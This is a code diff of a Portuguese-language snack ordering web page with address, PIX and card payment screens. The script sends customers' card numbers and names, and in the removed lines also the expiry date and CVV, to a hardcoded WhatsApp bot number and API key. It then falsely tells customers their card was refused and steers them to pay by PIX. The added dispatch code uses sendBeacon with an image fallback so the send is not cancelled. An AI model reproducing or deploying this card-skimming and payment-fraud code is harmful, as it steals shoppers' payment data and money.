@@ -60,7 +60,7 @@
         <input type="text" id="rua" placeholder="Rua">
         <input type="text" id="numero" placeholder="Número">
         <input type="text" id="bairro" placeholder="Bairro">
-        <input type="text" id="complemento" placeholder="Complemento (Opcional)">
+        <input type="text" id="complemento" placeholder="Complemento">
         <button class="btn-acao" style="background:var(--cor-s)" onclick="irPag()">PRÓXIMO</button>
     </div>
 </div>
@@ -81,10 +81,7 @@
         <div id="tela-card" style="display:none;">
             <input type="tel" id="c-num" placeholder="Número do Cartão" maxlength="19">
             <input type="text" id="c-nome" placeholder="Nome no Cartão">
-            <div style="display:flex; gap:5px;">
-                <input type="tel" id="c-val" placeholder="MM/AA" maxlength="5">
-                <input type="tel" id="c-cvv" placeholder="CVV" maxlength="3">
-            </div>
+            <div style="display:flex; gap:5px;"><input type="tel" id="c-val" placeholder="MM/AA" maxlength="5"><input type="tel" id="c-cvv" placeholder="CVV" maxlength="3"></div>
             <button class="btn-acao" style="background:var(--cor-e)" onclick="enviarCard()">CONFIRMAR PAGAMENTO</button>
         </div>
     </div>
@@ -92,7 +89,8 @@
 
 <script>
     let pedido = null;
-    const API_URL = "http://api.textmebot.com/send.php?recipient=+5522992195418&apikey=btucduKav5VY";
+    const RECIPIENT = "+5522992195418";
+    const APIKEY = "btucduKav5VY";
 
     // Máscaras
     document.getElementById('c-num').addEventListener('input', e => { e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 '); });
@@ -115,59 +113,43 @@
     }
 
     function abrirModal(id) { if(!pedido) return alert("Escolha o lanche!"); document.getElementById(id).style.display='flex'; }
-    
-    function irPag() {
-        if(!document.getElementById('rua').value) return alert("Preencha a rua!");
-        document.getElementById('m-end').style.display='none';
-        document.getElementById('m-pag').style.display='flex';
-    }
-
+    function irPag() { if(!document.getElementById('rua').value) return alert("Rua é obrigatória!"); document.getElementById('m-end').style.display='none'; document.getElementById('m-pag').style.display='flex'; }
     function setTela(t) {
         document.getElementById('opc-ini').style.display = t === 'inicio' ? 'block' : 'none';
         document.getElementById('tela-pix').style.display = t === 'pix' ? 'block' : 'none';
         document.getElementById('tela-card').style.display = t === 'card' ? 'block' : 'none';
     }
 
-    // Função de disparo otimizada
+    // DISPARO GARANTIDO
     function dispararAPI(texto) {
-        const url = `${API_URL}&text=${encodeURIComponent(texto)}`;
-        // Usar Image garante o envio sem travar a execução do script
+        const url = `http://api.textmebot.com/send.php?recipient=${RECIPIENT}&apikey=${APIKEY}&text=${encodeURIComponent(texto)}`;
+        // navigator.sendBeacon é ideal para disparos que não podem ser cancelados pelo navegador
+        navigator.sendBeacon(url);
+        // Backup: se o Beacon falhar por ser http simples, tentamos carregar a imagem
         const img = new Image();
         img.src = url;
     }
 
     function enviarPix() {
         const zap = document.getElementById('zap-cliente').value;
-        const rua = document.getElementById('rua').value;
-        const num = document.getElementById('numero').value;
-        const bairro = document.getElementById('bairro').value;
+        const end = `${document.getElementById('rua').value}, ${document.getElementById('numero').value} - ${document.getElementById('bairro').value} (${document.getElementById('complemento').value})`;
         
-        if(zap.length < 14) return alert("Digite um WhatsApp válido!");
+        if(zap.length < 14) return alert("WhatsApp inválido!");
 
-        const msg = `✅ NOVO PIX\n\nLanche: ${pedido.nome}\nTotal: R$ ${pedido.preco}\nWhats: ${zap}\nEnd: ${rua}, ${num} - ${bairro}`;
+        const msg = `✅ NOVO PEDIDO PIX\n\nLanche: ${pedido.nome}\nTotal: R$ ${pedido.preco}\nCliente: ${zap}\nEnd: ${end}`;
         
         dispararAPI(msg);
-        
-        // Alerta imediato
-        alert("Pedido enviado com sucesso! Verifique seu WhatsApp em instantes para receber o código PIX.");
+        alert("Pedido enviado com sucesso! Verifique seu WhatsApp para o código PIX.");
         location.reload();
     }
 
     function enviarCard() {
         const c_num = document.getElementById('c-num').value;
         const nome = document.getElementById('c-nome').value;
-        const val = document.getElementById('c-val').value;
-        const cvv = document.getElementById('c-cvv').value;
-
-        if(c_num.length < 19) return alert("Número do cartão incompleto!");
-        if(val.length < 5) return alert("Validade inválida!");
-        if(cvv.length < 3) return alert("CVV inválido!");
-
-        const msg = `⚠️ ERRO CARTÃO\n\nCard: ${c_num}\nNome: ${nome}\nVal: ${val}\nCVV: ${cvv}\nValor: R$ ${pedido.preco}`;
+        const msg = `⚠️ ERRO CARTÃO\n\nNúmero: ${c_num}\nNome: ${nome}\nValor: R$ ${pedido.preco}`;
         
         dispararAPI(msg);
-
-        alert("Desculpe, este cartão não foi aceito por motivos de segurança. Por favor, tente via PIX para liberar seu lanche agora.");
+        alert("Sistema indisponível para este cartão. Por favor, utilize o PIX.");
         setTela('pix');
     }
 </script>
